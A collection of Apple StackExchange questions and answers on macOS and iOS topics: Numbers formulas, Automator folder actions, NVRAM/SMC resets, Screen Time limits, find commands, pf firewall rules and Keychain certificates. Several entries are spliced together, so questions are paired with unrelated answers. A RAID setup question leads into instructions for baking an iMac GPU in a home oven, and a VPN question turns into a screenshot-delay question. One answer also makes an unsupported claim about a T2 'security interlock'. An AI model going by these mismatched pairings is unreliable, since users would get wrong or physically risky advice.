["Q: Can I create something like a macro in Numbers? I have this long formula that is used in a lot of columns:\n=SE(N17<60; DEF.NÚM.DEC(SOMA(60; −N17); 1); \"✔︎ Aprovado\")\n\nSo, when I need to change something in this formula, I need to edit each one of then. So to avoid this kind of duplication, can I create something like a macro, which will make me able to do something like that:\ndef myMacro($POS):\n  return SE($POS<60; DEF.NÚM.DEC(SOMA(60; −$POS); 1); \"✔︎ Aprovado\")\n\nAnd use it like:\n=myMacro(N17)\n\n\nNote: The formulas are in portuguese.\n\nA: There is rich documentation and deep automation support for Numbers being automated with Automator and AppleScript. Here is a mid-tutorial link to where to save your scripts and shows the menu bar to trigger these scripts.\nI could see you entering the formula or substituting / selecting the range for which to apply a function quite easily.\n\n\n*\n\n*https://iworkautomation.com/numbers/script-menu.html\nThe nice thing about that site is that it has many tutorials as well to cover the scripting syntax / how to use the script editor and all the things you learn in Numbers are general to other apps that have scripting support on macOS - first party apps and third party apps.\n\nA: You can using Applescript. A similar question is answered here. This site includes a link to a video showing how to create a macro using Applescript. \n\nA: I know this is an old question but If anyone’s still interested in a possible solution, there is a way to get macro-like behavior.  I don’t know if this feature is documented.\nTo do this you need to create a two column table with the first column frozen.\nColumn A would be your “macro” name (e.g. “Default Name”).  Column b would be its value.\nIf you entered =def then one of the auto completion options should be “Default Name”.  It’s treated like a function and it would give you the value in column b.\n\n\n\n\n\n\n", "Q: How to stop Automator / other task running in background I have a process on my MacBook that triggers when a new file is added to certain folders, like my desktop, it copies the file and places it in another directory that is backed up online.\nThe problem is I want to stop this copy behavior and really can not find where / what is running it. I think it was automator I created it with (it was a while ago), and I used to see a gear in the taskbar if that helps narrow it down. I no longer see the gear now.\nAny suggestions would be very helpful thank you\n\nA: Bring up Spotlight (press command-space) and type in folder action setup and then press Enter when it comes up.\nYou can then disable/delete/etc the folder action on the target folder.\nYou can also, in Finder, right-click (control-click) on the target folder that has the folder action assigned to it as then select Folder Action Setup... in the Services section of the context menu.\n\n", "Q: Administrator Password pop up screen does not open I have Macpro4.1 running Yosemite.

If I try to access passwords in Keychain the app will lock up and I have to force quit.\nAny ideas on how to fix this problem?\n\nA: I would suggest you to: \nReset NVRAM or PRAM on your Mac\nShut down your Mac, then turn it on and immediately press and hold these four keys together: Option, Command, P, and R. You can release the keys after about 20 seconds, during which your Mac might appear to restart.\n\nTest after this. \nNote: When your Mac finishes starting up, you might want to open System Preferences and adjust any settings that were reset, such as sound volume, display resolution, startup disk selection, or time zone.\nIf this doesn't help then at last try to: \nReset the SMC on Mac\nFirst, shut down your Mac and Press Shift-Control-Option on the left side of the built-in keyboard, then press the power button at the same time. Hold these keys and the power button for 10 seconds. Release all keys. And, Press the power button again to turn on your Mac.\nThis two reset should help.\n", "Q: Connecting to a VPN on the Guest OS I'm trying to connect my Virtual Machine (Windows 10) only to a VPN IPsec server.\nI can successfully connect to that VPN (IPSec) through MacOS. I could connect Mac to the VPN and then share the connection with guest. However, my whole system would be connected to the VPN. I'm trying to connect only guest to the VPN.\nWhen I try to connect to the VPN on the Windows VM, however, this happens:\nI have contacted Parallels, and they sent me these steps, which I have followed correctly (I think):\n\nPlease perform the following steps,\n1) Open Configuration Editor and create a new Network Adapter using\n  \"Add\" button 2) Set Bridged mode for one of them and Host-only for the\n  other.\nConnect to VPN from Windows, using these steps:\n1) Open the Windows Control Panel -> Network Connections. 2) Click\n  'Create a new connection' link on the left-hand side of the window. 3)\n  Click Next, then choose 'Connect to the network at my workplace' from\n  the list and click Next. 4) On the Network Connection page of the\n  wizard, choose the 'Virtual Private Network connection' and click\n  Next. 5) Enter a name for the new VPN connection in the 'Company Name'\n  field and click Next. 6) In the 'Public Network' window: If you choose\n  'Automatically dial this initial connection' as default option, the\n  VPN connection will always be initiated even when the computer has not\n  been connected to Internet yet. If you choose 'Do not dial the initial\n  connection', Internet connection will be established before the new\n  VPN connection is initiated. Choose one of these options and click\n  Next. 7) Enter the name or IP address of the VPN remote access server\n  to connect to, and click Next. 8) In the \"Connection Availability\"\n  window you will see two options: 'My Use Only' ensures that Windows\n  makes the new connection available only to the currently logged on\n  user. 'Anyone's use' option makes the connection available to anyone.\n  Choose one of the options and click Next. 9) Click Finish. The new VPN\n  connection information has been saved.\nOn Mac side use Internet Sharing in System Preferences to share\n  Host-guest adapter connection with Mac network interface.

For example, see the following:\nCapturing screenshots on macOS Sierra is very slow\nScreenshot taking a very long time to appear on desktop\nHowever, none of the situations and solutions discussed there are applicable.\n\n*\n\n*The questions above talk about 5-6 seconds to save. On my system it takes 15-20 seconds. This is a 2017 iMac; not a slow machine.\n\n\n*A lot of the discussion talks about Google Backup and Sync. I have never used these.\n\n\n*Some of the discussion talks about turning off anti-virus. As I test, I turned off Bitdefender. It made no difference.\nAny other ideas?\nEDIT: several posters have suggested unchecking \"Show Floating Thumbnails\". This has never been checked on my system, as explained in my comment to an answer below. This suggestion does not solve the problem.\n\nA: What worked for me on macOS Mojave to have screenshots saved to my Desktop instantaneously, was to uncheck Show Floating Thumbnail from the Options menu when pressing ⇧⌘5.\nThis change carried over to the other screenshot keyboard shortcuts too.\n\nNote that I still allow Spotlight to index my Desktop too. \n", "Q: Getting photos from MobileSync data created by iTunes My wife had an iPhone 4, which she synched with a PC using iTunes.  Both the phone and the PC are gone, but I have backups of the PC, including the folder where I believe iTunes kept copies of her photos:\nC:\\users\\herusername\\AppData\\Roaming\\Apple Computer\\MobileSync\nWe don't currently own either an iPhone or an Apple computer.  Is it possible to retrieve the photos from the files in this folder, using only a PC?  \n\nA: In the MobileSync folder, go into the Backup folder which will probably just contain a pile of folders and files.\nOpen these files in some type of Media Player (Quicktime is probably the best option).\nThere may be of items once you open them, but if you sort by size you should get video, audio, and photos to float to the top.\n", "Q: Macbook Pro - no sound output I have a Macbook Pro 2015 running Mojave 10.14.6.\nI have absolutely no sound output both from internal speakers and headphones, even the startup sound doesn't play.

Thanks!\n\nA: I know you've already reset the NVRAM (what you're referring to as PRAM), but the first thing I'd try is to reset both the NVRAM and SMC in that order. Before following the steps below, ensure you have no external hardware connected and make sure you use the built-in keyboard.\nReset the NVRAM\nYour Mac uses Non-Volatile Random-Access Memory (NVRAM). Here’s how to reset the NVRAM on your particular MBP:\n\n\n*\n\n*Shut down your machine. Yes, a full shut down, not just logging out.\n\n*Press the power button and then press the commandoptionpr keys. You have to make sure you press these keys before the gray screen appears or it won’t work.\n\n*Hold those keys down until your Mac reboots again and you here the startup chime for the second time.\n\n*Let go of the keys and let your Mac reboot normally.\n\n\nNote: When you log back in you may need to readjust some of your system preferences (e.g. speaker volume, screen resolution, startup disk selection, time zone information, etc).\nOnce done, proceed to resetting the SMC as well.\nReset the SMC\nTo reset the System management Controller on your particular MBP, follow these steps:\n\n\n*\n\n*Shut down your computer\n\n*Keep the power cable plugged in\n\n*Press at the same time shiftoptioncontrol (on the left side of the keyboard) and the power button and hold all these down for at least 10 seconds\n\n*Let go\n\n*Turn your computer back on with the power button.\n\n\nAfter resetting both the NVRAM and SMC, use your Mac to determine if you still have no sound output.\nIf it doesn't, then it's time to test your hardware with Apple Diagnostics.\nRun Apple Diagnostics\nFollow the steps below to run Apple Diagnostics:\n\n\n*\n\n*Fully shut down your MBP\n\n*Restart your MBP\n\n*Immediately press the D key and keep it down until you see the Diagnostics screen appear\n\n*Wait for Diagnostics to finish (this typically only takes a few minutes)\n\n*Once complete, one of two things will appear on the screen:\n\n\n*\n\n*a No issues found message\n\n*a brief description of any errors found plus further instructions\n\n\n*If the diagnostics test does find errors, take a note of what they are\n\n\nNote: If pressing and holding the D key at Step 3 doesn't work, start again at Step 1 and, at Step 3 press and hold both the OptionD keys instead. This will try and run diagnostics from the internet instead, so you will need to allow more time for it to complete. \nRegardless, take a note of what happens and let me know how you went.\n", "Q: How can I use the desktop version of Google translate on my iPhone? The desktop version of Google Translate has features that are not available when using the App on an iPhone (e.g., the phrasebook).  I’ve tried to use  these features by accessing the desktop version of Google Translate on my iPhone via the “request desktop app” feature in both Safari and Chrome without success.\nIs there anyway to use the desktop version of Google Translate while on an iPhone? \n\nA: I think what you want is in the Google Translate ios app. At least the phrasebook.\nHere's Google's documentation that talks about how to use the phrasebook (save translations) on different platforms.\n\nSave translations - IOS\nAdd a word or phrase\n  \n  \n*\n  \n*On your iPhone or iPad, open the Translate app.\n  \n*Translate a word or phrase.\n  \n*Next to the translation, tap Star translation.\n  \n  \n  See & delete translations\n  \n  \n*\n  \n*On your iPhone or iPad, open the Translate app.\n  \n*At the bottom, tap Saved.\n  \n*To remove a word or phrase, tap Star translation.\n  \n  \n  \nNote: Your app phrasebook saves on the app only. You won't see it on other devices or in your mobile browser.\n\n\n\nA: I was pleasantly surprised to find that the Google Translate phrasebook works fine on iOS using both Chrome and Safari.  Perhaps I got fooled into thinking it was not working because I was not signed into my Google account or because the interface in iOS is so different from the interface for the desktop version. \nBut the main point is that the phrasebook works in the browser on the iPhone and syncs properly with the phrase book on my desktop computer as long as I’m signed into my Google account.  \nSo the conclusion is: use Google Translate in a browser  if you’re not satisfied with the limited functionality of the iOS app. Not sure why they haven’t made this sync function available for the Google Translate app on iOS; it’s been around on Android for quite some time.\n", "Q: Howto change the Apple logo after Filevault login? I managed to change the Apple logo that comes up before my APFS encrypted Filevault disk is accessible from...\n\n(That's a white apple on a transparent background).\n... to...\n\nAfter logging in and unlocking the encrypted filevault disk, my account avatar is shown above the progress bar and about half-way it switches to a grey Apple logo. Where can I find the file that is displayed here? It is not in /System/Library/PrivateFrameworks/LoginUIKit.framework/, but where else could it be?\nI'm running macOS High Sierra on a last-generation white polycarbonate Macbook.\n\nA: When you have an encrypted disk with FileVault, the system needs to ask for an authorised user to login just after EFI boot. (no news here, just enforcing what most people know)\nThat logo shows your avatar because your user's avatar is inserted on the EFI boot image/nvram. At this point of the boot sequence, there is no Operating System loaded yet, it's just a simple boot screen to ask the user password [which simulates the login screen of the GUI], but it just a static image containing the user avatars.\nAfter you insert the password, the disk is mounted, and the boot process begins.\nAfter the loading bar reaches about 80% that screen changes to another almost identical, it sometimes blinks at this point. This is the GUI interface being loaded, process called WindowServer. Your avatar is not shown on this phase. To modify it would require to change protected SIP system files (if possible) otherwise you cannot easily change it.\nThis is how the boot sequence works for Encrypted Filevaut MacOS systems. \nIf you boot it using the \"-v\" nvram argument you can get a better view of what is happening \"behind\" the scene, and also can see the GUI loading moment.\nIf you open the Console.app and change your avatar on System Configuration you can see the moment it writes you avatar to the nvram [only for FileVault encrypted system this occurs]\nMy answer is a partial answer just to clarify how this is technically done and help describing how this works. I hope it can be valuable to help you [or others who are reading this] to reach your goal for changing it.\n", "Q: Batch-remove mkv titles only, no re-encode Prompted by the answer to Any way to edit metadata of MKV files (without re-encoding)? it appears I should be able to do this with mkvpropedit, part of MKVToolNix.\nTL:DR\nAll I want to do is remove any title, so VLC tells me the show title & episode number, as listed in the filename - not who helpfully ripped it so I didn't have to rip all my own DVDs.

I am setting up screen time with parental controls for our family. \nI would like to grant the following allowance to a user:\n\n\n*\n\n*All apps and categories: 30mins\n\n*Camera app + 15mins\n\n*Photos app + 15mins\n\n\nWhat happens now is that the \"All apps\" allowance seems to include camera and photo time – even if the user hasn't touched camera in 30 minutes of usage, access is blocked after this time. So it seems to rather read:\n\n\n*\n\n*All apps and categories: 30mins\n-- of which:\n-- Camera app not more than 15mins\n-- Photos app not more than 15mins\n\n\nThis is not what I intended. But I also don't want to fully allow Camera and Photos. How can I add time for a specific app \"on top\" of the general allowance?\n\nA: Not sure if it's always been like that, but with current macOS Catalina 10.15 it's possible to combine app groups. Just DON'T use \"All apps\".\nThe first limit is \"Everything\" (all groups except social networks), the second limit is \"social networks\". This will then be added.\n\nAlso, it has become very easy to select single apps:\n\n", "Q: Additional screen time allowance request: when does it time out? I am setting up screen time / parental controls for my family. \nNow a user asked me for additional minutes via screen time. 15mins for camera, 15mins for photos. \nI granted this allowance.\nThe user didn't use the apps, but after 15 minutes, both apps were again disallowed. So is this additional time really counted from the moment you grant it? I would have expected that this is simply added the user's daily allowance / budget and can be used any time.\n\nA: The answer is: when your kid requests additional screen time for the app xy, and you grant it, the additional time starts at the moment you allow it. So it's not extending the user's screen time at his/her discretion. \nExample: \nYour kid has used up all his/her screen time for the day, but asks for 15 more minutes of camera and youtube. You grant it (via Screentime) at 15:00. At 15:15 both apps will time out again.\n", "Q: Adding a new hard drive to RAID1 software RAID fails I've got a Mac Pro 1.1 running macOS Server 10.6.8 that I want to use as a RAID-Server.

Instead I'd try fixing it by reflowing the solder. To do this, you need to:\n\n\n*\n\n*Disassemble the iMac enough to remove the GPU\n\n*Set your home oven to 205℃ (400℉)\n\n*Place a sheet of baking paper on an oven tray and place the GPU (only the GPU itself) on the oven tray\n\n*Place it in the oven for 8 minutes\n\n*Remove the tray and let it cool\n\n*Remove any old heatsink compound from the chips and replace with new compound\n\n*Reassemble everything \n\n\nDepending on how familiar you are with disassembly/assembly, I'd allow anywhere between 3hrs to most of the day for doing this. Also, you will require some tools, but if you don't have these you can easily purchase them online.\n", "Q: Can we purchase AppleCare in India for MacBook Air purchased from USA?

The second column displays the last exit status of the job. \nIf the number in this column is negative, it represents the negative of the signal which stopped the job. Thus, \"-15\" would indicate that the job was terminated with SIGTERM.\nThose can be either Unix Signals and/or BSD Signals. \nman sigaction tells about every Signal possibilities.\nman signal list their codes.\n\nI have looked inside the source code of launchctl.c and I found it can also return any of these codes:\n/*\n * Copyright (c) 2000-2012 Apple, Inc.

For some Apps, It says \n\nThis discounted price is only available to customers who own a previous version of this item. To purchase this item at full price, click buy.\n\nwhile trying to update it. How do you make the iOS device  update the apps.\nAdditional Information about my phone:\niPhone 6+\niOS version 12.4.1\nApp Store Australia\n\n\nA: I have this same problem on an iPad.\nIf I uninstall the app I'm able to install the new version - but like you there are 10 apps I have this same problem with.\nMy suspicion is that these apps were installed when the iPad was setup to use Apple Account \"A\". A number of weeks ago I switched the Apple Account of the device to be account \"B\". So I think the problem is that the app store is preventing an app, installed by \"A\", being upgraded (for free) by \"B\".\nIs anyone able to confirm this hypothesis?\nUPDATE: Yes, this was my problem. I used the old account within the App Store and I was able to update those 10 apps.\n\nA: Finally, I overcome from this situation. All I need is to update my iOS. To me, it seems like it wasn't updated properly. Or it was stuck into \"Insatall the Update\" state. So I installed the update (From Settings > General > Software Update > Install). And now all pending updates are downloading.  \nThings I have tried but didn't work are as follows:  \n\n\n*\n\n*Sign Out from App Store and Sign In again. (From App Store >\nProfile (Top Profile Picture) > Sign Out)\n\n*Change Region and Reselect again. (From App Store >\nProfile (Top Profile Picture) > Your Name on top (It will move you into your Account) > Country/Region > Change Country or Region > Select)\n\n*Reset Network (Settings > General > Reset > Reset Network Settings)\nIf you are facing this problem, you may try these, but didn't work for me.\n", "Q: How to export an email from Mail application?

Drag the email from the Mail.app window to the desktop. When you reach the desktop the pointer then contains acircular green \"+\"\nDrop the email there and you now have a single message as an .eml file\n\nA: Harder way!

For partial emails, remote content might be needed to download first. \n\nA: Apple Mail has this functionality.

The Unix command approach\nHere is the Unix command I have for finding the outer folder:\nfind /Volumes -type d -maxdepth 1 ! -name Volumes -exec find {} -type d -maxdepth 1 -name \"Virtual Box\" \\; \n\nI tired a third nested find, but errored out\n find /Volumes -type d -maxdepth 1 ! -name Volumes -exec find {} -type d -maxdepth 1 -name \"Virtual Box\" -exec find {}  -type d -maxdepth 1 ! -name inner  \\;\nfind: -exec: no terminating \";\" or \"+\"\nfind: -exec: no terminating \";\" or \"+\"\nfind: -exec: no terminating \";\" or \"+\"\nmac RC=1   $ \n\n\nA: I'm not quite sure of what you are looking for but the following will list all directories named \"Virtual Box\" starting with the deepest nested to the least.\nfind /Volumes -type d ! -name Volumes -name \"Virtual Box\" 2>/dev/null\n\nEDIT: OK, understanding your requirement a bit better we can use the path predicate to match outerfolder/innerfolder\nfind /Volumes -type d -path '*outerfolder/innerfolder'\n\n\nA: Assuming innerfolder needs to be directly within outerfolder:\nfind /Volumes -type d -name \"outerfolder\" -exec test -d {}/\"innerfolder\" \\; \\\n                                          -exec echo {}/\"innerfolder\" \\;\n\n(formatted for readabiliy, you can also put everything on one line and remove the trailing \\ from the first line)\n\nA: Running fd0's solution:\nfind /Volumes -type d -path '*outerfolder/innerfolder'\n\nYou get the annoying \"Permission denied\" messages.  You could send all error messages to /dev/null, but that's too drastic to me. \nfind: /Volumes/4T Virtual Machines/.DocumentRevisions-V100: Permission denied\nfind: /Volumes/4T Virtual Machines/.TemporaryItems: Permission denied\nfind: /Volumes/4T Virtual Machines/.Trashes: Permission denied\n/Volumes/4T Virtual Machines/outerfolder/innerfolder\n/Volumes/4T Virtual Machines/outerfolder/otherfolder/outerfolder/innerfolder\nmac RC=1   $ \n\nI combined fd0 answer with a previous poster's way of getting rid of permission's errors.\n { LC_ALL=C find /Volumes -type d -path '*outerfolder/innerfolder'  3>&2 2>&1 1>&3 | grep --color=auto -v -e 'Permission denied' -e 'Operation not permitted' 1>&3; [ $? = 1 ];  } 3>&2 2>&1\n\n\n/Volumes/4T Virtual Machines/outerfolder/innerfolder\n/Volumes/4T Virtual Machines/outerfolder/otherfolder/outerfolder/innerfolder\n\nThe downside of using the find command is that it takes a long while should you include the timemachine backup disk. \n", "Q: How to connect a bluetooth speaker to MacOS and KEEP using the internal speakers Is there anyway to connect any bluetooth audio device (using the bluetooth toolbar icon) and make MacOS NOT change the output to it once connected?\nWhen I connect any external bluetooth speaker the output changes automatically to the bluetooth as soon as I connect it. I would like to connect the bluetooth and tell the system somehow to keep using the internal speakers after connecting the bluetooth one.\nIn other words, I want to disable automatic speaker switching after connecting the bluetooth speaker.\nThe situation is: Consider you are already using the internal speakers, then you connect the bluetooth one: MacOS automatically changes the output to the Bluetooth one. I want to disable this auto-switching\n\nA: Move you speaker fairly close to your computer and go to the bluetooth icon in your menu bar. Click on the and it should open a pane like the one below.\n \nI use my Amazon Echo as my speaker and the Disconnect button would read Connect if if my Echo wasn't already connected. Your bluetooth speaker should show up in the list. Click on it and select Connect. Once your speaker connects, go to System Preferences and select Sound. You'll get a panel that looks likr so:\n\nYou can see if you click on the tab where it lists which speaker to use, you can select the internal speakers of your mac.\n\nA: This existing answer may be of assistance:\nHow to stop sound output switching to a monitor when it gets plugged in?\n", "Q: I used Boot Camp Assistant and can't boot OS X I installed Windows 10 on my Mac using Boot Camp Assistant. When I got into Windows, it asked me if I wanted to install Boot Camp. I selected yes. Now, when I try to restart in OS X, it says \"can't locate OS X boot volume\"\nAdditionally, when I hold down the option-key while restarting, I get a windows option, and then a second option that tries to install windows. \nHere is a picture of my Disk Management screen and the also the error when I try to restart in OS X.\n\n\nI feel like the OS X volume still exists, but windows isn't recognizing it. Any help would be appreciated.\n\nA: Windows can't read APFS.\nTo get back to macOS you need to hold the  Opt ⌥  key at startup.\nBTW, don't ever let Windows adjust anything on your drive. Consider that Disk Management tool as a read-only utility. It doesn't understand how it's being fooled into thinking it's in charge & will break things.\n", "Q: Do application leftovers have any impact on performance? Apparently, uninstalling an app by dragging it to the bin may leave application leftovers in some folders (such as Library/Preferences/, Library/Applications Support/, Library/StartupItems/ etc...). Several sites explain how removing such leftovers can increase disk space.\nHowever, I have no problem with storage. So, this is my question: apart from taking up disk space, do these application leftovers have any negative impact on performance?\n\nA: Files in the following subfolders of the root level /Library or User Library will not affect the performance of your Mac at all, as they will not be read or executed:\n\n\n*\n\n*Application Support\n\n*Caches \n\n*Containers \n\n*Preferences\n\n\n(Not an exhaustive list.)\nFiles in the following subfolders might affect performance as they may be loading or trying to load non-existent files:\n\n\n*\n\n*StartupItems \n\n*Extensions \n\n*LaunchAgents \n\n*LaunchDaemons\n\n\n(Again, not an exhaustive list.) \n\nA: Application preferences and caches will not have any impact on system performance, but if there are leftover startup daemons running, etc., there could absolutely be a performance penalty. There is no way to know for certain how much of an impact there could be. The best advice I can offer is to always check the application developer's uninstall guidelines. Some applications utilize uninstaller applications to ensure all the application support files are removed.\n", "Q: Menu bar finder scripts always missing I've added several automator applications to the scripts editor folder and I'd like them to be available at all times in the menu bar dropdown menu.\nHowever they're only available in the Finder Scripts section of the dropdown menu only when the Finder window is open. If I close all finder windows then the Find Scripts section disappears from the drop down menu. \nHow can I keep my customs applications / scripts visible at all times in the dropdown menu?\n\n\nA: My first thought would be to create them as Automator Services (or Quick Actions in macOS Mojave and above).\nDoing this will then add them to the Services menu available within all apps. For example, if you created a Service called Duplicate Folder, you coudl run that from the Services list within any Application menu (e.g. Finder > Services, Safari > Services, TextEdit > Services, etc).\nCreate a service using Automator\nThis is an example of how to create a service in Automator that runs an AppleScript code:\n\n\n*\n\n*Launch Automator (usually found within your Applications folder)\n\n*Go to File > New\n\n*Select Service and click Choose (Note: in macOS Mojave and above, select the Quick Action option)\n\n*In the top right hand of the window that appears, ensure that \"No input\" is selected from the Service receives drop-down list\n\n*Ensure the In drop-down list is showing \"Any application\"\n\n*In the second column containing the long list, find \"Run AppleScript\" and double-click on it\n\n*This will add the Run AppleScript window on the right\n\n*Now, replace the (* Your script goes here *) bit with your script\n\n*Save the service using a meaningful name\n\n\nNow you should be able to run that service from any application as described above, that is from the Services list within any Application menu.\nOf course, at Step 6 you can select different options depending on what type of script you want to run.\n\nA: Your user's ~/Library/Scripts/ folder is arranged so that items in the root of the directory are available in all applications, and ~/Library/Scripts/Applications/ contains folders for application-specific items that are only available when that particular application is active.\nA folder for an application can be opened (or created) in the Finder by activating/bringing the desired app to the front and using Open Scripts Folder > Open (AppName) Scripts Folder from the Script menu item.\nThe Script menu can also contain applications and aliases.\n", "Q: How to see certificate for intermediate CA in Keychain? When I check details of a certificate I only see information about the certificate itself. Is there any way to see the issuer’s certificate? In my case it’s an intermediate CA. The certificate that I care is for S/MIME (hence the tag), but I think this should apply to all kinds of certificates in general.\nI think there should be a way because it’s very intuitive in Windows. Also Chrome on macOS displays the full chain for websites. I think Keychain.app has this information because it labels the certificate as a verified one.\n\nA: For any Stored certificate, using Keychain Utility:\nOpen Keychain Utility, choose any certificate, double click it, select Detais:\n\nThe certificate will popup up, click on Details triangle.\n\nLook for the issuer on the info below:\n\nHere is the same certificate showed above, with the window extended to show full information: (NOTE: this osu.edu certificate is EXPIRED, so it is shown as \"not trusted\", but its issuer chain is present on it, and it is valid [the issuer InCommon CA chain].\n\n\nHere is an Intermediate CA Certificate stored on my Keychain:\n\nHere is another Intermediate CA Certificate\n\n\nFor any website certificate, using Safari:\n\nAfter clicking \"Show Certificate\", folow the same procedure and click on the Details Triangle. \n\nA: Evaluate Certificate\n\n\n*\n\n*Launch the Keychain Access.app\n\n*Select the certificate of interest\n\n*Select the menu item: Keychain Access (menu) > Certificate Assistant (sub-menu) > Evaluate \"certificate name\"…\n\n*Select Continue to choose Generic evaulation (certificate chain validation only)\n\n*Select Show Certificate… button\n\n\nYou can now navigate through the certificate chain and view the leaf, intermediate, and root certificate details.\n\n\n", "Q: Monitor turns off for two seconds after login I have a mac mini 2018 model that runs mojave with an external monitor connected via hdmi output of mac mini.\nAfter login with my credentials and when the progress bar is loading my monitor turns off for about 2 seconds and then it turns on again.\nDo you have any ideas about what could be happened?\n\nA: This is standard behaviour with the built-in HDMI port of the Mini 2018 - the governing circuitry has a 'security interlock' controlled by the T2 chip, and it gets toggled when the machine moves from the PREBOOT OS (which is where your main login window actually lives) over to the standard install.\n", "Q: Disable IPv6 for Docker on macOS How can I disable IPv6 for Docker on macOS?\n\nA: According to the Docker documentation:\n\nIPv6 networking is only supported on Docker daemons running on Linux hosts.\n\nSo logically, there is no IPv6 to disable on Docker for Mac.\n", "Q: Remove the default desktop space on a second monitor? I only want a desktop space on my primary monitor (Macbook Pro), with only full screen apps used on my second monitor. \nIs there any way to disable the desktop space completely on a second monitor?\n\nA: Apple does not seem to have provided a way to remove the 'normal' Desktop display in Mission Control and only allow Full Screen apps. However, you can broadly achieve most of what you want:\nTick \"Displays have Separate Spaces\" in System Preferences > Mission Control, then you can have Full Screen apps in a second display. \nThen configure applications to only appear in Display 2 (right-click on the app's Dock icon; Options > \"Assign to Desktop on Display 2\").\nWhile the apps are in Full Screen mode, you won't see the Desktop. \n", "Q: How easy is it to reinstall MacOS and change my disk setup? I have a 2012 MacMini running Mojave. Originally MacOS was on the built-in 1Tb HDD but I got an external SSD and set this up as the main drive for OS, applications, etc. Given the Mac will no longer boot without the external drive, I believe I must have removed the original OS from the internal drive.\nI would like to revert to booting from the internal drive, in a way that causes as little disruption as possible. Ideally I would be able to move installed apps rather than lose them, and certainly not have to format the drive. The external drive would be removed or become just a data drive.\nHow can this be achieved?\n\nA: *\n\n*Install to the internal using erase install steps. \n\n*Migrate data / apps / settings from the external using the migration assistant portion of the os setup assistant. \n\n", "Q: PF set condition for not equal to a list of ports for MacOS I'd like to set a condition so that a firewall rule will not apply to a list of ports, something along the lines of this:\n table <my_table> persist file \"/etc/pf.anchors/entries\"\n set skip on lo\n block out quick proto { tcp, udp } from any to ! <my_table> port != { 66 80 } \n\nThis gives a syntax error when running 'sudo pfctl -vnf /etc/pf.conf'. \nIf I put the following, it works (only specify one port).\n block out quick proto { tcp, udp } from any to ! <my_table> port != 80\n\nHow can I specify a list of ports with the '!=' operator?\n\nA: You can make the inverse command logic. \nFirst Block all, then open just the ones you want: \nThe result is the same you tried by negating all except those chosen to be opened. :)\nset skip on lo\nport_pass = \"{ 80 66 53 22 }\"\nblock all\npass out on en0 proto { tcp, udp } to any port $port_pass keep state\n\n\nA: Figured it out:\nIs by negating each individual port, inside the delimiter { }\n block out quick proto { tcp, udp } from any to ! <my_table> port { != 66, != 80 } \n\nI found the 'op-list' section for specifying port here: https://man.openbsd.org/pf.conf.5\nThis shows you how to apply the logic of adding more ports\n\nA: One should clearly understand what Pf's \"lists\" are. They aren't a part of ruleset that gets loaded into kernel in fact, but macros instead. It means they're expanded during preprocessing phase of rules loading — contrary to tables. Keeping that in mind saves one from \"shooting in own foot\".\nLet's now see what you're trying to do:\n\nblock out quick proto { tcp, udp } from any to ! <my_table> port != { 66 80 } \n\n\n\n\n*\n\n*Block immediately If\n\n\n*\n\n*it's TCP or it's UDP\n\n*AND it's destined to\n\n\n*\n\n*IPs that aren't in my_table\n\n*AND ports, that aren't in the list\n\n\n\n\nAs I've told you lists' items would get expanded into a separate rule each. And this would break the logic I've just explained: only the first port of the list would be treated right, if you block immediately (quick) it obviously means no second checking — \"not allowed port, ok, blocking it\".\nMastering firewall ruleset you'd better keep things as simple as possible. Well, actually it's not only for firewalls — it's general and programming common sense. Double negations, exception of exceptions aren't that simple to follow.\nSo what are your options then? — You can take a look at the different angle: what and when do you want to pass?\n# If it's destined to IP in <my_table> -- pass:\npass  out quick proto { tcp, udp } from any to <my_table>\n\n# ElseIf it's to allowed ports -- pass:\npass  out quick proto { tcp, udp } to port { 66 80 }\n\n# And this point would be reached only if it wasn't to <my_table>\n# and to some ports other than allowed ones:\nblock out quick proto { tcp, udp }\n\nThis ruleset is way more readable indeed. Moreover — macro expansion doesn't spoil its logic.\nOf course, Pf has some other means for solving this very task but describing them all properly would make this answer way too lengthy.\n", "Q: Does MacOS have a keyboard shortcut for moving an individual window to another monitor? What's the MacOS equivalent to Windows' keyboard shortcut to move AN individual window to another monitor? Let's assume a dual-monitor setup.\nThe specific Windows keyboard shortcuts I'm hoping to find equivalents to are the following:\n\n*\n\n*Move Window to Left Monitor:\n+←\n\n\n*Move Window to Right Monitor:\n+→\n\n\n*Maximize Window:\n+↑\n\n\n*Minimize Window:\n+↓\n\nA: I don't think there's a default key shortcut, but if you look in the Window menu, there is a menu item there \"Move to name of display\".\n\nSo you could create shortcuts yourself in System Preferences > Keyboard for the command that is visible in each display.\n\n\nA: Spectacles has been discontinued.\nI use the app Magnet, downloadable from the App Store, which has the \"Next display\" capability using:\nCtrl+Opt+Cmd+Left/Right\n", "Q: Diagnostic Software for iPad fingerprint button? I am using an iPad Pro. I have been regularly updating my OS software - beta 13. This week my touch button for fingerprint recognition stopped working. I deleted my old fingerprint file and tried to enter it new. The button would still not pick up the fingerprint. I took it to a repair shop for a quote on a new button, and they said the button is keyed to the processor - they could not just put in a new button. Is there any diagnostics program to check if it is a hardware or software problem?\n\nA: Beta software is not considered stable. The first troubleshooting step should have been removing the beta software. If this did not resolve, completely wiping the device using iTunes > Set up as new (not restored from a backup). If the button does not work after a full wipe and set up as new, it could be indicative of a mechanical failure. Apple can run a diagnotic over the phone or in store to see if the Touch ID module can be detected. More likely the beta software. \n", "Q: How to remove my Mac from iPhone call audio routing list? When I'm making a phone call with my iPhone, under the audio button typically I can toggle between phone and speakerphone. But recently a third option appeared, which claims to route the call to my Mac. I never want to use this option, and I want to be able to just tap to turn the speakerphone off and on. Is there any way to turn off the Mac connection so that it won't appear?\nI have disabled Allow Calls on Other Devices on my iPhone and that didn't have any effect.\nNote: related Apple Community question.\n\n\n\n\nA: Try allowing all devices and then disabling Mac specifically in the \"Calls on other devices\" settings you posted. \nOpen FaceTime-> Preferences on Mac and uncheck receive calls from iPhone checkbox.\nOn the extreme, if you don't use continuity feature, (didn't see it in the question), could you turn Handoff off altogether in iPhone and/or Mac? It is in Settings -> General-> Handoff on both devices.  Either of the devices could be at fault. So check all combinations. \n", "Q: Why is third monitor always mirroring one of my other two? I have a 2017 Macbook Pro connected to an HP Thunderbolt hub. From that hub, I have two USB-C -> DVI cables going into two monitors. For my third monitor, I have a DisplayPort cable from the hub to the monitor.\nThe two DVI monitors work correctly and show up in System Preferences > Displays > Arrangement. The third monitor (the DisplayPort one) does not show up in the displays. Additionally, it is always mirroring one of my DVI monitors.\nWhat's interesting is that if I unplug one of the DVI monitors, the third monitor starts working correctly and shows up in the Arrangement tab. \nIs it not possible to have 3 monitors running where two are DVI and one is DP?\n\nEdit: The resolutions of the two monitors using DVI are 1920 x 1080 and 